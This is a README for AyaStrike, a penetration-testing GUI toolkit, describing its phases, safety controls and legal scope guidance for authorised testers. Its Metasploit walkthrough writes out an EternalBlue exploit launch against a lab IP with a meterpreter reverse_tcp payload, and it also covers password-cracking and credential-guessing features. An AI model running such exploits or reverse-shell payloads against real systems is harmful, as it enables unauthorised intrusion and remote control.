# AyaStrike — All-In-One Penetration Testing Toolkit

**made by Ruel**

A Python desktop application that puts the standard penetration-testing
lifecycle into a single, modern tabbed GUI — with target-scope enforcement,
tamper-evident audit logging, adjustable rate limiting, and AI-assisted
reporting built in from the ground up. AyaStrike is the full-suite evolution of
the AyaRecon cockpit.

> ⚠️ **Authorised use only.** AyaStrike is built exclusively for authorised
> penetration testers, security professionals, and educational lab
> environments. Only test systems you own or have **explicit, written
> permission** to test. See [Legal & Responsible Use](#legal--responsible-use).

---

## Table of contents

1. [Why AyaStrike](#why-ayastrike)
2. [The 7-phase workflow](#the-7-phase-workflow)
3. [Safety architecture](#safety-architecture)
4. [Setup guide](#setup-guide)
5. [Quick start](#quick-start)
6. [Module reference](#module-reference)
7. [Tutorials — step by step](#tutorials--step-by-step)
8. [External tool references](#external-tool-references)
9. [The plugin architecture](#the-plugin-architecture)
10. [Project layout](#project-layout)
11. [Legal scope guidelines](#legal-scope-guidelines)
12. [Responsible disclosure policy](#responsible-disclosure-policy)
13. [Disclaimer](#disclaimer)

---

## Why AyaStrike

Pentesters normally juggle a dozen separate tools and copy data between them by
hand. AyaStrike keeps the whole engagement in one cockpit:

- **One workspace per engagement** — scope, findings, host/service inventory,
  and audit trail all live together in a local SQLite database.
- **Everything is scope-gated** — no module can touch a target that is not on
  the engagement's authorised whitelist.
- **Everything is logged** — a tamper-evident, hash-chained audit log records
  every action for a defensible record of what was done.
- **Offline-first** — the core workflow needs no internet and no third-party
  packages; optional integrations (nmap, Metasploit, Ollama, Shodan) extend it.
- **Modular** — drop a new Python file in a phase package (or in your plugins
  folder) and it appears in the GUI automatically.

## The 7-phase workflow

| Phase | Tab | What it covers |
|------:|-----|----------------|
| 1 | **Passive Reconnaissance** | WHOIS, DNS records, subdomain discovery (CT logs + wordlist), email harvesting, Shodan, Wayback |
| 2 | **Active Scanning** | Host discovery, TCP port scanning, service/version detection, OS fingerprinting, SMB/SNMP/DNS enumeration, web directory discovery |
| 3 | **Vulnerability Assessment** | CVE/CWE matching (offline + NVD), passive web security review, SSL/TLS audit, misconfiguration review — **no automatic exploitation** |
| 4 | **Service Modules** | Web application recon interface, wireless survey (passive), cloud bucket exposure |
| 5 | **Credential Toolkit** | Username generation, wordlist generation, **offline** hash auditing — online/brute-force capabilities are **disabled by default** behind an authorisation gate |
| 6 | **Exploitation Interface** | Metasploit Framework integration via its RPC API — browse/search modules, launch with confirmation, session management, console fallback — **every run permanently logged** |
| 7 | **AI-Assisted Reporting** | Risk scoring, attack-path correlation, remediation guidance, export to PDF / HTML / CSV |

## Safety architecture

AyaStrike treats safety as infrastructure, not decoration. These controls are
enforced in the framework (`aya/core/`) so no individual module can bypass them.

- **Startup legal disclaimer** — the app will not run until you affirm
  authorised use; acceptance is recorded.
- **Target scope whitelist** (`core/scope.py`) — every module calls
  `scope.require(target)` before any network action. Supports IPs, CIDRs,
  hostnames, and `*.wildcard` domains, plus a deny-list that always wins.
  Private/loopback ranges are allowed by default for home labs; public targets
  must be added explicitly.
- **Authorisation gate** (`core/authz.py`) — intrusive capabilities (online
  credential testing, exploit launching, offline brute force) are **off by
  default**. Enabling one requires a red-warning dialog, a written-permission
  confirmation checkbox, **and** typing a confirmation phrase. Grants are
  in-memory only and last for the session.
- **Tamper-evident audit log** (`core/audit.py`) — every action is appended to
  a SHA-256 hash-chained JSONL log. `Tools → Verify Audit Log` re-walks the
  chain and reports any tampering.
- **Permanent exploit log** — exploit launches are additionally written to
  `exploit_runs.log` in the project directory.
- **Adjustable rate limiting** (`core/ratelimit.py`) — a token-bucket limiter
  and concurrency cap keep scans polite and within agreed bounds; everything is
  cancellable instantly from the UI.
- **Safe subprocess runner** (`core/runner.py`) — external tools are invoked as
  argument lists with **no shell**, removing command-injection surface, and
  degrade gracefully when a tool is not installed.

## Setup guide

### Requirements
- **Python 3.9+** (3.11+ recommended). On Windows, use the installer from
  [python.org](https://www.python.org/downloads/) — it includes Tkinter.
- Works on Windows, Linux, and macOS. (Primary target: Windows desktop.)

### Easiest: one-click (Windows)

Unzip, open the `aya_suite` folder, and **double-click `setup_and_run.bat`**.
It finds Python, installs dependencies, checks your environment, and launches
the app — all in one window that stays open so you can read any message. That's
it.

### Manual install

```bash
# 1. Get the code
cd aya_suite

# 2. (Optional) create a virtual environment
python -m venv .venv
.venv\Scripts\activate          # Windows
# source .venv/bin/activate     # Linux/macOS

# 3. Install optional dependencies (the core runs without them)
pip install -r requirements.txt

# 4. Run (any of these)
python main.py                  # from a terminal
#   double-click  setup_and_run.bat   (Windows, one-click)
#   double-click  run_aya.bat         (Windows, if deps already installed)
#   ./run_aya.sh                      (Linux/macOS)
```

Verify your environment at any time with `python main.py --check`.
On Linux, if Tkinter is missing: `sudo apt install python3-tk`.

### Optional external tools
Install these separately to unlock the modules that use them:
- **nmap** — advanced scans, OS detection, SMB/SNMP NSE scripts.
- **Metasploit Framework** — the exploitation interface. Start its RPC service:
  ```bash
  msfrpcd -U msf -P <your-password> -p 55553
  ```
  then enter the host/port/user in **Settings** and the password per-run.
- **Ollama** — local LLM for the AI reporting layer. Install, then:
  `ollama pull llama3.1`. Set the host/model in **Settings**.

## Quick start

1. Launch `python main.py` and accept the disclaimer.
2. **Project → New Project** — name it after your engagement.
3. Go to the **◈ Scope** tab and add every authorised target (e.g.
   `192.168.56.0/24`, `*.lab.example`). Keep **Enforce scope** on.
4. Work left-to-right through the phase tabs. Pick a module, fill the form,
   press **▶ Run**. Output streams live; findings populate automatically.
5. Watch results build up in **◈ Findings** (with a live risk score).
6. When done, run **AI-Assisted Reporting → Generate Report** for PDF/HTML/CSV.
7. Check **◈ Audit** any time; use **Verify Integrity** to confirm the log is
   intact.

## Troubleshooting — "nothing runs"

If double-clicking does nothing or a window flashes and vanishes:

1. **Run the diagnostic.** Open a terminal in the `aya_suite` folder and run:
   ```bash
   python main.py --check
   ```
   It reports your Python version, whether Tkinter is available, which optional
   packages are installed, and whether all modules load. Fix anything marked
   `MISSING` / `FAILED`.
2. **Use the launcher.** On Windows, double-click **`run_aya.bat`** (not
   `main.py`) — it finds Python, runs the app, and **keeps the window open** so
   you can read any error. On Linux/macOS use **`./run_aya.sh`**.
3. **Check Python is installed and on PATH.** `python --version` should print
   3.9+. On Windows, reinstall from [python.org](https://www.python.org/downloads/)
   and tick *"Add python.exe to PATH"* (the Microsoft Store build can lack
   Tkinter).
4. **Tkinter missing?** Windows/macOS: reinstall Python from python.org.
   Linux: `sudo apt install python3-tk`.
5. **Still failing?** A startup crash is written to **`ayastrike_error.log`**
   (in the app folder, or your home directory) and shown in a dialog. That log
   has the exact cause.

You do **not** need to `cd` into any particular folder — the app adds its own
location to the import path, so it runs from anywhere.

## Module reference

### Phase 1 — Passive Reconnaissance
- **WHOIS Lookup** (`recon.whois`) — registration data via port-43 WHOIS with
  referral following.
- **DNS Records** (`recon.dns`) — A/AAAA/MX/NS/TXT/SOA/CNAME/SRV/CAA; flags
  missing SPF. Uses `dnspython` if present.
- **Subdomain Discovery** (`recon.subdomains`) — Certificate Transparency
  (crt.sh) + DNS wordlist resolution.
- **Email Harvester** (`recon.email_harvest`) — collects addresses from the
  domain's public pages.
- **Shodan Lookup** (`recon.shodan`) — host exposure from Shodan (needs API key).
- **Wayback URLs** (`recon.wayback`) — historical URLs from the Internet
  Archive; flags backups/configs/admin paths.

### Phase 2 — Active Scanning
- **Host Discovery** (`scan.host_discovery`) — live-host sweep via TCP probes
  (no root needed).
- **Port Scan (TCP connect)** (`scan.port_scan`) — pure-Python, rate-limited.
- **Nmap Scan** (`scan.nmap`) — wrapper for advanced scans (input-file flags
  blocked to preserve per-target scope).
- **Service / Version Detection** (`scan.service_detect`) — banner grabbing +
  HTTP(S) fingerprinting.
- **OS Fingerprint** (`scan.os_fingerprint`) — nmap `-O` (needs admin/root).
- **SMB / SNMP Enumeration** (`scan.smb_enum`, `scan.snmp_enum`) — NSE-backed.
- **DNS Enumeration** (`scan.dns_enum`) — AXFR zone-transfer check.
- **Web Directory Discovery** (`scan.web_dirscan`) — content discovery of
  common paths; flags sensitive exposures.

### Phase 3 — Vulnerability Assessment  *(detection only, no exploitation)*
- **CVE / CWE Matching** (`vuln.cve_match`) — maps discovered versions to a
  bundled offline signature set, optionally cross-checking NVD.
- **Web Security Headers / Config** (`vuln.web_scan`) — missing headers,
  insecure cookies, version disclosure, directory listing.
- **SSL/TLS Audit** (`vuln.ssl_audit`) — certificate validity/expiry,
  hostname mismatch, deprecated protocol acceptance.
- **Misconfiguration Review** (`vuln.misconfig`) — flags risky exposed services
  from the inventory (databases, Redis/Mongo/ES with no auth, Telnet, etc.).

### Phase 4 — Service Modules
- **Web App Recon Interface** (`svc.webapp`) — allowed methods, CORS policy,
  `security.txt`, framework fingerprint (read-only).
- **Wireless Survey** (`svc.wireless_survey`) — lists nearby networks and
  encryption via OS tooling. **Passive only** — no deauth or handshake attacks.
- **Cloud Bucket Exposure** (`svc.cloud_exposure`) — detects public
  S3/GCS/Azure buckets for an org name (exposure detection, not exfiltration).

### Phase 5 — Credential Toolkit
- **Username Generator** (`cred.username_enum`) — offline username candidates
  from real names.
- **Wordlist Generator** (`cred.wordlist_gen`) — themed password lists with
  leet/year/symbol mutation rules (offline).
- **Offline Hash Auditing** (`cred.hash_crack`) — dictionary mode (standard
  audit, no grant needed) against hashes you already possess; **brute-force
  (charset) mode is disabled** until you grant the `bruteforce` capability.
  Supports md5/sha1/sha256/sha512/NTLM.
- **Online Credential Test** (`cred.online_test`) — **disabled by default**,
  gated behind written-permission authorisation; scope-enforced, rate-limited,
  stops at the first valid credential, and caps attempts. For confirming
  weak/default creds during an authorised test — not large-scale guessing.

### Phase 6 — Exploitation Interface
Integrates your **own** Metasploit install over its RPC API. AyaStrike ships no
exploits; it orchestrates MSF.
- **Search Modules** (`exploit.msf_search`) — read-only, no grant needed.
- **Module Info / Options** (`exploit.msf_info`) — inspect before launching.
- **Launch Module** (`exploit.msf_execute`) — **gated** (`exploit` grant), plus
  a per-launch confirmation (retype the module name). RHOSTS are scope-checked;
  every launch is permanently logged.
- **Sessions** (`exploit.msf_sessions`) — list active sessions.

### Phase 7 — AI-Assisted Reporting
- **Generate Report** (`report.generate`) — risk score (0–100 with rating),
  correlated attack paths, AI (local Ollama) executive summary + consolidated
  remediation, exported to HTML, CSV, and PDF. Falls back to deterministic
  templated text when Ollama is unavailable.

## Tutorials — step by step

The same walkthroughs are built into the app (the **📘 Guide** tab and the
**Settings** tab). made by Ruel.

### Before anything: set your scope
The **◈ Scope** tab is the safety core. Add every authorised target to *Allow*:
single IPs (`203.0.113.10`), CIDRs (`192.168.56.0/24`), hostnames
(`host.lab.example`), or wildcard domains (`*.lab.example`). Private/loopback
ranges are allowed by default; public targets must be added explicitly. The
*Deny* list always wins. No module can touch anything out of scope — a
`scope violation` means the target isn't authorised. Click **Save Scope**.

### Typical engagement flow
1. **Project → New Project** (its own DB + audit log).
2. **◈ Scope** — add authorised targets.
3. Work the phase tabs left→right: Recon → Scanning → Vuln → Services →
   Credentials → Exploitation.
4. In any module: fill the form, press **▶ Run** (▶ output streams live; **■
   Stop** cancels instantly).
5. **◈ Findings** — watch the live risk score.
6. **AI-Assisted Reporting → Generate Report** — PDF/HTML/CSV.
7. **◈ Audit** — every action logged; **Verify Integrity** any time.

### Credential toolkit — what's gated
Username/wordlist generation and **offline dictionary** hash auditing work
freely (you audit hashes you already hold from an authorised test). **Brute-force
(charset) mode and the Online Credential Test are disabled by default** and
require an authorisation grant — they actively interact with systems. Online
testing is for confirming weak/default creds on an in-scope host, not mass
guessing; it is rate-limited, scope-checked, caps attempts, and stops at the
first valid credential.

### Exploitation Interface (Metasploit) — full walkthrough
AyaStrike ships **no exploits**. The Exploitation tab is a controller for *your
own* Metasploit install over its RPC API. Every launch is scope-checked and
**permanently logged** (audit log + `exploit_runs.log`).

**1. Start Metasploit's RPC service** (on the machine with Metasploit):
```bash
msfrpcd -U msf -P yourpassword -p 55553
```
`msfrpcd` uses SSL by default; to disable it add `-S` and untick *MSF RPC SSL*
in Settings.

**2. Point AyaStrike at it** (◈ Settings): set *MSF RPC host* (`127.0.0.1`),
*port* (`55553`), *user* (`msf`). The RPC **password is entered per-run** in the
module form and is never stored on disk.

**3. Search modules** (read-only, no grant): *Metasploit: Search Modules* →
e.g. term `eternalblue` (or `type:exploit smb`, `cve:2017-0144`). The console
lists matching module paths and ranks.

**4. Inspect options** (read-only): *Metasploit: Module Info / Options* →
type `exploit`, path `windows/smb/ms17_010_eternalblue`. Prints the description
and the **required** options.

**5. Authorise** (once per session): the first launch opens the red
authorisation dialog. Tick the written-permission box, type
`I HAVE WRITTEN AUTHORISATION`, and **Authorise**. Grant is in-memory only and
audit-logged; revoke via **Tools → Revoke All Authorisations**.

**6. Launch**: *Metasploit: Launch Module (gated)* →
```
Module type : exploit
Module path : windows/smb/ms17_010_eternalblue
Options     : RHOSTS=192.168.56.10
              LHOST=192.168.56.1
              PAYLOAD=windows/x64/meterpreter/reverse_tcp
Confirm     : windows/smb/ms17_010_eternalblue   (retype the module name)
```
`RHOSTS` is scope-checked; out-of-scope targets are refused. On success you get
a job id and, if it lands, a session.

**7. Sessions**: *Metasploit: Sessions* lists active sessions. Do deep
post-exploitation in the Metasploit console; AyaStrike records that a session
exists and logs every launch to `exploit_runs.log`.

> Only run this against systems you are explicitly, contractually authorised to
> exploit.

### Reporting
**Reporting → Generate Report** produces risk score, correlated attack paths, an
executive summary and consolidated remediation as HTML/CSV/PDF in the project's
`reports/` folder. The narrative is written by a **local Ollama** model
(`ollama pull llama3.1`, set host/model in Settings) so nothing leaves your
machine; without Ollama it falls back to templated text.

## External tool references
- **nmap** — <https://nmap.org/book/man.html>
- **Metasploit RPC** — <https://docs.metasploit.com/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html>
- **Shodan API** — <https://developer.shodan.io/>
- **NVD CVE API** — <https://nvd.nist.gov/developers/vulnerabilities>
- **Ollama** — <https://github.com/ollama/ollama>

## The plugin architecture

A module is one class:

```python
from aya.core.plugins import register
from aya.modules.base import BaseModule, Finding, ModuleInput, Phase, Severity

@register
class MyModule(BaseModule):
    id = "recon.my_thing"          # unique
    name = "My Thing"
    phase = Phase.PASSIVE_RECON
    description = "What it does."
    inputs = [ModuleInput("target", "Target")]
    # requires_authz = "exploit"   # set to gate it
    # disabled_by_default = True

    def run(self, ctx, params):
        ctx.scope.require(params["target"])   # enforce scope before probing
        ctx.gate()                            # honour the rate limit
        yield Finding(title="…", target=params["target"], severity=Severity.INFO)
```

Drop it in the matching `aya/modules/<phase>/` package, or into
`~/.ayastrike/plugins/` for a user plugin. It appears in the GUI automatically.
The framework enforces scope, authorisation, rate limiting, audit logging, and
cancellation around every `run()`.

## Project layout

```
aya_suite/
├─ main.py                 # entry point (disclaimer → GUI)
├─ requirements.txt
├─ README.md / LICENSE
├─ data/
│  ├─ cve_signatures.json  # bundled offline CVE signatures
│  └─ wordlists/
└─ aya/
   ├─ core/                # config, workspace, scope, audit, ratelimit,
   │                       # authz, runner, plugins, net, ai
   ├─ modules/             # one package per phase (the capabilities)
   └─ gui/                 # Tkinter GUI (theme, disclaimer, authz dialog,
                           # widgets, app)
```

Per-user data lives in `~/.ayastrike/` (override with the `AYASTRIKE_HOME` env var):
`settings.json`, `projects/<name>/` (each with `workspace.db`, `scope.json`,
`audit.jsonl`, `exploit_runs.log`, `reports/`), `wordlists/`, and `plugins/`.

## Legal scope guidelines

- **Get it in writing.** Before any active phase, have a signed authorisation /
  rules-of-engagement document naming the exact in-scope targets, the permitted
  techniques, the testing window, and emergency contacts.
- **Define scope precisely** in the ◈ Scope tab and keep **Enforce scope** on.
  Add only what you are authorised to touch. Use the deny-list for carve-outs
  (shared infrastructure, third-party services, production you must avoid).
- **Mind third parties.** Cloud-hosted assets, SaaS, and shared hosting often
  require the provider's permission too.
- **Throttle.** Set a rate limit appropriate to the target's fragility to avoid
  outages or account lockouts.
- **Keep the audit log.** It is your evidence that you stayed in scope.
- **Stop if you find something you weren't authorised to access** and follow
  your rules of engagement.

Unauthorised access to computer systems is a crime in most jurisdictions
(e.g. the US *Computer Fraud and Abuse Act*, the UK *Computer Misuse Act 1990*,
Australia's *Criminal Code Act 1995* Part 10.7). Authorisation is what separates
legal security testing from a criminal offence.

## Responsible disclosure policy

If you discover a vulnerability during an authorised engagement:

1. **Report privately first** to the system owner (and, for third-party
   software, the vendor) with enough detail to reproduce and fix it.
2. **Do not exploit beyond proof of concept**, exfiltrate data, or disrupt
   service beyond what is necessary to demonstrate the issue — and only within
   your authorised scope.
3. **Give reasonable time to remediate** (commonly 90 days) before any public
   disclosure, and coordinate timing with the owner.
4. **Request a CVE** through the vendor or a CNA where appropriate.
5. **Keep records** (your audit log and report) and share them with the owner.

Follow any program-specific policy (bug bounty / VDP) and your engagement's
rules of engagement where they are stricter than the above.

## Disclaimer

AyaStrike is provided for **authorised security testing, research, and
education only**. You are solely responsible for ensuring your use is lawful and
authorised. The author (**Ruel**) accepts no liability for misuse or for any
damage arising from use of this software. If you do not have explicit permission
to test a target, **do not**.
